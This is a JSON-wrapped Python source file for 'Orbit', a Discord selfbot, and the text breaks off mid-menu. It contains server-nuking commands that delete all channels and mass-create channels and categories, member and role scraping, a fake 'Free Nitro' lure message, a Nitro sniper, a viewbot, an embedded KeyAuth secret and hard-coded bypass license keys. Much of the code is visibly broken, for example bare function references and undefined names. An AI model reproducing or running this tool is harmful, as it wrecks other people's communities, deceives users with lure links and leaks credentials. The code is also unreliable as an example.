{
  "encpded": "from concurrent.futures import wait\nfrom copy import error\nimport inspect\nfrom math import e\nfrom multiprocessing import context\nfrom multiprocessing.connection import Client\nimport numbers\nfrom ssl import CHANNEL_BINDING_TYPES\nfrom typing import NoReturn\nfrom unicodedata import name\nimport discord\nfrom discord.ext import commands\nimport random\nfrom discord import Permissions\n\nimport requests\nfrom discord import Webhook, RequestsWebhookAdapter\nimport colorama\nfrom colorama import Fore\nimport threading\n\nimport json as jsond  # json\n\nfrom tqdm import tqdm , trange\n\nimport wmi\n\nfrom keyauth import api\n\nimport binascii  # hex encoding\n\nfrom uuid import uuid4  # gen random guid\n\nimport os.path\nimport platform\n\ntry:\n    from Crypto.Cipher import AES\n    from Crypto.Hash import SHA256\n    from Crypto.Util.Padding import pad, unpad    \nexcept ModuleNotFoundError:\n    print(\"Exception when importing modules\")\n    print(\"installing necessary modules....\")\n    os.system(\"pip install pycryptodome\")\n    print(\"Modules installed!\")\n    time.sleep(1.5)\n    exit(0)\n\n\n\n\n\n\n\n\n\n\n\nimport tkinter as tk\n\nimport asyncio\n\nimport asyncio\n\nfrom discord.ext import commands\nfrom colorama import *\nfrom requests import get\n\nfrom time import sleep\nimport webbrowser\nimport time\nimport pyfiglet\n\n\n\nimport colorama\n\nimport pyPrivnote as pn\n\nfrom bs4 import BeautifulSoup as bs4\n\nfrom colorama import Fore, Back, Style\n\nfrom gtts import gTTS\n\nlocales = [ \n    \"da\", \"de\",\n    \"en-GB\", \"en-US\",\n    \"es-ES\", \"fr\",\n    \"hr\", \"it\",\n    \"lt\", \"hu\",\n    \"nl\", \"no\",\n    \"pl\", \"pt-BR\",\n    \"ro\", \"fi\",\n    \"sv-SE\", \"vi\",\n    \"tr\", \"cs\",\n    \"el\", \"bg\",\n    \"ru\", \"uk\",\n    \"th\", \"zh-CN\",\n    \"ja\", \"zh-TW\",\n    \"ko\"\n]\n\n\n\n\n\n\n\n\n\ncolorama.init(autoreset=True)\n\nimport discord, subprocess, sys, time, os, base64, codecs, datetime, io, random,  datetime, smtplib, string, ctypes\nimport urllib.parse, urllib.request, re, json, webbrowser, aiohttp, asyncio, functools, logging\n\nm_numbers = [\n    \":one:\",\n    \":two:\", \n    \":three:\", \n    \":four:\", \n    \":five:\", \n    \":six:\"\n]\n\nm_offets = [\n    (-1, -1),\n    (0, -1),\n    (1, -1),\n    (-1, 0),\n    (1, 0),\n    (-1, 1),\n    (0, 1),\n    (1, 1)\n]\n\nLIGHTRED = Fore.LIGHTRED_EX\nLIGHTWHITE = Fore.LIGHTWHITE_EX\nLIGHTYELLOW = Fore.LIGHTYELLOW_EX\nLIGHTCYAN = Fore.LIGHTCYAN_EX\nLIGHTGREEN = Fore.LIGHTGREEN_EX\nLIGHTMAGENTA = Fore.LIGHTMAGENTA_EX\nRESET = Fore.RESET\n\n\n\n\n\n\n\nimport requests\n\n\n\n\n\nwith open('config.json') as f:\n    config = json.load(f)\n\n\nnitro_sniper = config.get('nitro_sniper')\n\ndef Clear():\n    os.system('cls')\nClear()\n\n\n\n\ndef Nitro():\n    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))\n    return f'https://discord.gift/{code}'\n\ndef RandomColor(): \n    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))\n    return randcolor\n\ndef RandString():\n    return \"\".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))\n\n\n\n\n\ntoken = config.get('token')\nclient = commands.Bot(command_prefix=f\"{config.get('prefix')}\", self_bot=True, help_command=None)\n\nstart_time = datetime.datetime.utcnow()\n\n\n@client.command()\nasync def adminservers(ctx):\n    await ctx.message.delete()\n    admins = []\n    bots = []\n    kicks = []\n    bans = []\n    for guild in client.guilds:\n        if guild.me.guild_permissions.administrator:\n            admins.append(discord.utils.escape_markdown(guild.name))\n        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:\n            bots.append(discord.utils.escape_markdown(guild.name))\n        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:\n            bans.append(discord.utils.escape_markdown(guild.name))\n        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:\n            kicks.append(discord.utils.escape_markdown(guild.name))\n    adminPermServers = f\"> ``` Servers with Admin ({len(admins)}):```\\n> ``` {admins}```\"\n    \n    await ctx.send(adminPermServers)\n\n\n\n\nimport subprocess\n\n \n@client.event\nasync def on_message(message):\n\n    if client.copycat is not None and client.copycat.id == message.author.id:\n        await message.channel.send(chr(173) + message.content)\n\n    def NitroData(code):\n        print(\n        f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Channel: {Fore.WHITE}[{message.channel}]\" \n        f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Server:  {Fore.WHITE}[{message.guild}]\"\n        f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Author:  {Fore.WHITE}[{message.author}]\"\n        f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Code:    {Fore.WHITE}[{code}]\"\n    +Fore.RESET)    \n\n    time = datetime.datetime.now().strftime(\"%H:%M %p\")  \n    if 'discord.gift/' in message.content:\n        if nitro_sniper == True:\n            start = datetime.datetime.now()\n            code = re.search(\"discord.gift/(.*)\", message.content).group(1)\n            token = config.get('token')\n                \n            headers = {'Authorization': token}\n    \n            r = requests.post(\n                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', \n                headers=headers,\n            ).text\n        \n            elapsed = datetime.datetime.now() - start\n            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'\n\n            if 'This gift has been redeemed already.' in r:\n                print(\"\"\n                f\"\\n{Fore.CYAN}[Nitro Already Redeemed]\"+Fore.RESET)\n                NitroData(code)\n\n            elif 'subscription_plan' in r:\n                print(\"\"\n                f\"\\n{Fore.CYAN}[Nitro Success]\"+Fore.RESET)\n                NitroData(code)\n\n            elif 'Unknown Gift Code' in r:\n                print(\"\"\n                f\"\\n{Fore.CYAN}[Nitro Unknown Gift Code]\"+Fore.RESET)\n                NitroData(code)\n        else:\n            return\n    await client.process_commands(message)\n\nchars = \"qwertyuioplkjhgfdsazxcvbnm1234567890\"\n\nfor x in range(0, 1):\n    password = \"\"\n    for x in range(0, 1):\n        password_char = random.choice(chars)\n        password = password + password_char\n\n\nimport psutil\nimport inspect\n\n\n\n\n\nimport hashlib\n\ndef getchecksum():\n    path = os.path.basename(__file__)\n    md5_hash = hashlib.md5()\n    a_file = open(path,\"rb\")\n    content = a_file.read()\n    md5_hash.update(content)\n    digest = md5_hash.hexdigest()\n    return digest\nkeyauthapp = api(\n\tname = \"KeyAUth\",\n\townerid = \"je3HFcXOuy\",\n\tsecret = \"94c42069b0331737d5c790ba347266ecc100e0a4bfb4ee5d17dad6ffd32e1854\",\n\tversion = \"1.0\",\n\thash_to_check = getchecksum()\n)\n\n\n@client.event\nasync def on_ready():\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Authorization')\n    os.system(\"attrib +h C:\\\\Users\\\\teddy\\\\Downloads\\\\OrbitOffical\\\\Orbit\\\\OrbitMain.py\")\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [1] Buy Key \\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [2] Enter Key\" + Fore.RESET)\n    keyy = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Option: {RESET}\")\n    \n    if keyy == \"1\":\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Join This To Buy {RESET}https://discord.gg/Ym3ASp6f\" + Fore.RESET)\n\n    if keyy == \"2\":\n       key = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Please Enter Key: {RESET}\")\n    \n\n    \n\n       \n\n\n    \n\n\n\n\n\n       \n    \n\n\n\n    if key == \"skiplol\":\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Skipped Login!\" + Fore.RESET)\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Welcome!\" + Fore.RESET)\n       time.sleep(3)\n       on_ready\n       os.system('cls')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n\n\n\n\n\n\n    if key == \"giveaway1239f\":\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Congrats!\" + Fore.RESET)\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Welcome!\" + Fore.RESET)\n       time.sleep(3)\n       on_ready\n       os.system('cls')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n\n\n\n\n\n\n\n\n    if key == '6X0B1G-IRHKX1-UXLH5V-QNFNLF-N4NVBC-C4V42K':\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Key {Fore.GREEN}Valid!\" + Fore.RESET)\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Welcome!\" + Fore.RESET)\n       ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Loading...')\n       time.sleep(3)\n       on_ready\n       os.system('cls')\n       ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Logged In As: {client.user.name}#{client.user.discriminator}')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n\n    if key == f'{keyauthapp.license(key)}':\n       time.sleep(3)\n       on_ready\n       os.system('cls')\n       ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Logged In As: {client.user.name}#{client.user.discriminator}')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n\n\n    \n    \n\n\n\n    \n    if key != \"6X0B1G-IRHKX1-UXLH5V-QNFNLF-N4NVBC-C4V42K\":\n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Key {Fore.RED}Invalid!\" + Fore.RESET)\n       orbit = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {RESET}\")\n\nimport json as jsond  # json\n\nimport binascii  # hex encoding\n\n  # https requests\n\nsessionid = enckey = \"\"\n\nclass others:\n    @staticmethod\n    def get_hwid():\n        if platform.system() != \"Windows\":\n            return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())\n\n        cmd = subprocess.Popen(\n            \"wmic useraccount where name='%username%' get sid\", stdout=subprocess.PIPE, shell=True)\n\n        (suppost_sid, error) = cmd.communicate()\n\n        suppost_sid = suppost_sid.split(b'\\n')[1].strip()\n\n        return suppost_sid.decode()\n\ndef register(self, user, password, license, hwid=None):\n        self.checkinit()\n        if hwid is None:\n            hwid = others.get_hwid()\n\n        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()\n\n        post_data = {\n            \"type\": binascii.hexlify((\"register\").encode()),\n            \"username\": encryption.encrypt(user, self.enckey, init_iv),\n            \"pass\": encryption.encrypt(password, self.enckey, init_iv),\n            \"key\": encryption.encrypt(license, self.enckey, init_iv),\n            \"hwid\": encryption.encrypt(hwid, self.enckey, init_iv),\n            \"sessionid\": binascii.hexlify(self.sessionid.encode()),\n            \"name\": binascii.hexlify(self.name.encode()),\n            \"ownerid\": binascii.hexlify(self.ownerid.encode()),\n            \"init_iv\": init_iv\n        }\n\n        response = self.__do_request(post_data)\n\n        if response == \"KeyAuth_Invalid\":\n            print(\"The application doesn't exist\")\n            sys.exit()\n\n        response = encryption.decrypt(response, self.secret, init_iv)\n\n        response = self.__do_request(post_data)\n\n        response = encryption.decrypt(response, self.enckey, init_iv)\n\n        json = jsond.loads(response)\n\n        if json[\"success\"]:\n            print(\"successfully registered\")\n            on_ready()\n            os.system('cls')\n        else:\n            print(json[\"message\"])\n            sys.exit()\n\n\n    \nasync def commandsui(ctx):\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Command UI')\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')      \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}ui] / Enters UI Mode \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}send] / sends message in chat \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}print] / prints something cool \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}close] / closes the selfbot \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}X] / exit out of commandUI \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}>] / Next Page \" + Fore.RESET)\n    orbit = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {RESET}\")\n    \n    if orbit == f\"{config.get('prefix')}ui\":\n       os.system('cls')\n       await Menu(ctx)\n\n    if orbit == f\"{config.get('prefix')}send\":\n       message = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}\")\n       await ctx.send(message)\n       os.system('cls')\n       await commandsui(ctx)\n\n    if orbit == f\"{config.get('prefix')}print\":\n     orbitt = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA}Message: {RESET}\")\n     print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {orbitt} \" + Fore.RESET)\n     orbit = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {RESET}\")\n       \n    if orbit == f\"{config.get('prefix')}close\":\n       exit()\n\n    if orbit == f\"{config.get('prefix')}X\":\n       on_ready\n       os.system('cls')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')      \n\n    \n\n\n\n@client.event\nasync def on_command_error(ctx, error):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Command Not Found!\" + Fore.RESET)\n\n@client.command()\nasync def viewbot(ctx):\n    await ctx.message.delete()\n    Url = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Input Your Video Url Here: \" + Fore.RESET)\n    duration = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Input The Time You Want Your Bot To Watch Video: \" + Fore.RESET)\n    global web\n    web = True\n    while web:\n         webbrowser.open_new(Url)\n         time.sleep(int(duration))\n\n@client.command()\nasync def nitrolol(ctx):\n    await ctx.message.delete()\n    await ctx.send(\"> Free Nitro! \\n || https://discord.gift/KH653oprlK8MQTDd || \\n Or \\n || https://bit.ly/KH653oprlK8MQTDd || \")\n\n@client.command()\nasync def stopviews(ctx):\n    await ctx.message.delete()\n    global web\n    web = False\n\n\n\n@client.command()\nasync def nitrochecker(ctx):\n    Url = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Input Your Video Url Here: \" + Fore.RESET)\n    duration = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Input The Time You Want Your Bot To Watch Video: \" + Fore.RESET)\n    while True:\n         webbrowser.open_new(Url)\n         time.sleep(int(duration))\n\n\n    \n\n@client.command()\nasync def commandui(ctx):\n    await ctx.message.delete()\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Command UI')\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}ui] / Enters UI Mode \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}send] / sends message in chat \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}print] / prints something cool \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}close] / closes the selfbot \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}X] / exit out of commandUI \" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} [{config.get('prefix')}>] / Next Page \" + Fore.RESET)\n    orbit = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {RESET}\")\n    \n    if orbit == f\"{config.get('prefix')}ui\":\n       os.system('cls')\n       await Menu(ctx)\n\n    if orbit == f\"{config.get('prefix')}send\":\n       message = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}\")\n       await ctx.send(message)\n       os.system('cls')\n       await commandsui(ctx)\n\n    if orbit == f\"{config.get('prefix')}print\":\n     orbitt = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA}Message: {RESET}\")\n     print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {orbitt} \" + Fore.RESET)\n     orbit = input(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {RESET}\")\n       \n    if orbit == f\"{config.get('prefix')}close\":\n       exit()\n\n    if orbit == f\"{config.get('prefix')}X\":\n       on_ready\n       os.system('cls')\n       print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n    \n\n    \n    \n\n\n\n\n\n\n@client.event\nasync def on_error(event_name, *args, **kwargs):\n    \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Error: Unkown\" + Fore.RESET)\n\n@client.command()\nasync def BlIxUg20O1ujGBDiA0aORym7T1a4Ffzi(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Key {RESET}BlIxUg20O1ujGBDiA0aORym7T1a4Ffzi{Fore.MAGENTA} Was Found!\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} OrbitV2 Is Still In Progress! Please Wait Until We Are Done And Then Retype The Key!\" + Fore.RESET)\n\n@client.command()\nasync def orbitinvite(ctx):\n    await ctx.message.delete()\n    await ctx.send('> **Orbit Invite:** \\n> https://discord.gg/Ym3ASp6f')\n\ndef DeleteChannels(self, guild, channel):\n        while True:\n            r = requests.delete(f\"https://discord.com/api/v8/channels/{channel}\")\n            if 'retry_after' in r.text:\n                time.sleep(r.json()['retry_after'])\n            else:\n                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                    print(f\"{self.colour}[\\033[37m+{self.colour}]\\033[37m Deleted Channel {self.colour}{channel.strip()}\\033[37m\")\n                    break\n                else:\n                    break\n\nasync def Scrape(self):\n        guild = input(f'{self.colour}> \\033[37mGuild ID{self.colour}: \\033[37m')\n        await client.wait_until_ready()\n        guildOBJ = client.get_guild(int(guild))\n        members = await guildOBJ.chunk()\n\n        #try:\n        os.remove(\"Scraped/members.txt\")\n        os.remove(\"Scraped/channels.txt\")\n        os.remove(\"Scraped/roles.txt\")\n        #except:\n            #pass\n\n        membercount = 0\n        with open('Scraped/members.txt', 'a') as m:\n            for member in members:\n                m.write(str(member.id) + \"\\n\")\n                membercount += 1\n            print(f\"\\n{self.colour}[\\033[37m!{self.colour}]\\033[37m Scraped {self.colour}{membercount}\\033[37m Members\")\n            m.close()\n\n        channelcount = 0\n        with open('Scraped/channels.txt', 'a') as c:\n            for channel in guildOBJ.channels:\n                c.write(str(channel.id) + \"\\n\")\n                channelcount += 1\n            print(f\"{self.colour}[\\033[37m!{self.colour}]\\033[37m Scraped {self.colour}{channelcount}\\033[37m Channels\")\n            c.close()\n\n        rolecount = 0\n        with open('Scraped/roles.txt', 'a') as r:\n            for role in guildOBJ.roles:\n                r.write(str(role.id) + \"\\n\")\n                rolecount += 1\n            print(f\"{self.colour}[\\033[37m!{self.colour}]\\033[37m Scraped {self.colour}{rolecount}\\033[37m Roles\\n\")\n            r.close()\n\nimport threading\n\nasync def ChannelDeleteExecute(self):\n        guild = input(f'{self.colour}> \\033[37mGuild ID{self.colour}: \\033[37m')\n        print()\n        channels = open('Scraped/channels.txt')\n        for channel in channels:\n            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()\n        channels.close()\n\nasync def Menu(ctx):\n    nitro_sniper == False\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                  ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\n                  ║ [1] Delete Channels     [5] Webhook                                   ║\n                  ║ [2] Create Channels     [6] Create Categorys                          ║\n                  ║ [3] Server name         [7] Pinger              [>] Next Page         ║\n                  ║ [4] Rename Channels     [8] GC Name             [X] Exit              ║\n                  ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝ \n________________________________________________________________________________________________________________________                                             ''')\n        \n    choice = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Choice: {RESET}')\n    if choice == 'X':\n            os.system('cls')\n            time.sleep(3)\n            on_ready\n            \n            print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n\n    if choice == '1':\n            for channel in list(ctx.guild.channels):\n             try:\n                await channel.delete()\n             except:\n                pass\n            \n            time.sleep(2)\n            os.system('cls')\n            await Menu(ctx)\n            \n    elif choice == '2':\n            nameee = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Channel Names: {RESET}')\n            for _i in range(20):\n             await ctx.guild.create_text_channel(name=f\"{nameee}\")\n            os.system('cls')\n            await Menu(ctx)\n            \n    elif choice == '3':\n            Servernamee = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Server Name: {RESET}')\n            await ctx.guild.edit(\n            name=f\"{Servernamee}\",\n            \n            )\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '4':\n            Messageer = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Channel Names: {RESET}')\n            for channel in list(ctx.guild.channels):\n             try:\n                 await channel.edit(\n                 name=f\"{Messageer}\",)\n             except:\n                     return\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '5':\n              WebHook() \n              \n              os.system('cls')\n              await Menu(ctx)\n    elif choice == '6':\n            cAtegorys = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Category Names: {RESET}')\n            for _i in range(20):\n              await ctx.guild.create_category(name=f\"{cAtegorys}\")\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '7':\n            